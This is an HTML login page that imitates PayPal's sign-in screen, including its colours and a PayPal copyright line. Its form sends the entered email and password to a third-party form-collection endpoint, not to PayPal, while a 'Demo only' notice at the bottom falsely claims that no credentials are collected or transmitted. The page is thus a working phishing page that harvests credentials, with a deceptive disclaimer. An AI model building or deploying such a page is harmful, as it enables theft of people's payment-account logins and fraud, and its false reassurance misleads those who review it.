<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to your PayPal account</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      background-color: #f5f7fa;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #2c2e2f;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 0 16px;
    }

    .card {
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
      padding: 40px 36px 32px;
      margin-bottom: 24px;
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 28px;
    }

    .logo svg {
      width: 120px;
      height: auto;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      text-align: center;
      margin-bottom: 28px;
      color: #2c2e2f;
    }

    .form-group {
      margin-bottom: 18px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 6px;
      color: #2c2e2f;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      font-size: 15px;
      border: 1px solid #9da3a6;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.15s ease;
    }

    input[type="email"]:focus,
    input[type="password"]:focus {
      border-color: #0070ba;
      box-shadow: 0 0 0 1px #0070ba;
    }

    .forgot {
      text-align: right;
      margin-top: -10px;
      margin-bottom: 22px;
    }

    .forgot a {
      font-size: 13px;
      color: #0070ba;
      text-decoration: none;
    }

    .forgot a:hover {
      text-decoration: underline;
    }

    .btn-login {
      width: 100%;
      padding: 14px;
      background-color: #0070ba;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 24px;
      cursor: pointer;
      transition: background-color 0.15s ease;
    }

    .btn-login:hover {
      background-color: #005ea6;
    }

    .btn-login:active {
      background-color: #004b87;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 24px 0;
      color: #6c7378;
      font-size: 13px;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #cbd2d6;
    }

    .divider span {
      padding: 0 12px;
    }

    .btn-signup {
      width: 100%;
      padding: 13px;
      background-color: #ffffff;
      color: #2c2e2f;
      font-size: 15px;
      font-weight: 600;
      border: 1.5px solid #2c2e2f;
      border-radius: 24px;
      cursor: pointer;
      transition: background-color 0.15s ease;
    }

    .btn-signup:hover {
      background-color: #f5f7fa;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #6c7378;
      line-height: 1.6;
    }

    .footer a {
      color: #0070ba;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .demo-note {
      margin-top: 20px;
      padding: 12px 16px;
      background: #fff3cd;
      border: 1px solid #ffecb5;
      border-radius: 6px;
      font-size: 13px;
      color: #664d03;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo">

        </svg>
      </div>

      <h1>Log in to your account</h1>

      <form action="https://submit-form.com/dteT1j9N7" method="POST">
  <div class="form-group">
    <label for="email">Email or mobile number</label>
    <input type="email" id="email" name="email" autocomplete="username" required />
  </div>

  <div class="form-group">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autocomplete="current-password" required />
  </div>

  <div class="forgot">
    <a href="#">Forgot password?</a>
  </div>

  <button type="submit" class="btn-login">Log In</button>
      </form>
      <div class="divider">
        <span>or</span>
      </div>

      <button type="button" class="btn-signup">Sign Up</button>
    </div>

    <div class="footer">
      <p>
        <a href="#">Contact Us</a> ·
        <a href="#">Privacy</a> ·
        <a href="#">Legal</a> ·
        <a href="#">Worldwide</a>
      </p>
      <p style="margin-top: 8px;">© 1999–2026 PayPal. All rights reserved.</p>
    </div>

    <div class="demo-note">
      <strong>Demo only</strong> — This is a static frontend mockup.  
      No credentials are collected or transmitted.
    </div>
  </div>
</body>
</html>
